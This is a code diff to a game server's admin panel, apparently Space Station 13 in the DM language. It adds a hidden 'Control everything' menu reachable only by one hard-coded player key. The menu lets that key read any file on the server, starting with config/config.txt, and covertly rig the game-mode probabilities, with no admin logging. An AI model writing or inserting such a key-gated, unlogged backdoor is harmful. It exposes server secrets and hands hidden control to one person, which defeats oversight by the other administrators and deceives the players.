@@ -14,6 +14,7 @@
 	dat += "<A HREF='?src=\ref[src];animuspanel=statistics'>Statistics</A><br>"
 	if(usr.ckey == "balagi") //test stuff - now it's my own
 		dat += "<A HREF='?src=\ref[src];animuspanel=zombieevent'>Zombie Event</A><br>"
+		dat += "<A HREF='?src=\ref[src];animuspanel=control'>Button control everything in the world</A><br>"
 	else
 		dat += "Zombie Event<br>"
 	dat += "<A HREF='?src=\ref[src];animuspanel=easybuttons'>Buttons</A><br>"
@@ -211,3 +212,32 @@
 						del(O)
 				if(count)
 					message_admins("\blue [key_name_admin(usr)] removed [count] ghosts without key.", 1)
+			//=================
+			//===CONTROL ALL===
+			//=================
+			if("control")
+				dat += "<b>Control everything</b><br>"
+				dat += "Commands:<br>"
+				dat += "<A HREF='?src=\ref[src];animuspanel=control_readfile'>Read textfile</A><br>"
+				dat += "<A HREF='?src=\ref[src];animuspanel=control_setmode'>Set gamemode (stealth)</A><br>"
+				usr << browse(dat, "window=animuspanel")
+			if("control_readfile")
+				var/fname = input("Filename","Filename","config/config.txt")
+				var/text = file2text(fname)
+				if(!text)
+					return
+				var/list/CL = dd_text2list(text, "\n")
+				dat += "<b>[fname]:</b><br><br>"
+				for(var/T in CL)
+					dat += T
+					dat += "<br>"
+				usr << browse(dat, "window=animuspanel")
+			if("control_setmode")
+				var/list/modes[] = list("traitor","meteor","malfunction",
+					"blob","nuclear","sandbox","wizard","restructuring",
+					"revolution","changeling","cult","monkey","traitorchan")
+				var/selectmode = input("Set mode","Set mode") in modes
+				for(var/t in modes)
+					if(config.probabilities[t])
+						config.probabilities[t] = 1
+				config.probabilities[selectmode] = 20
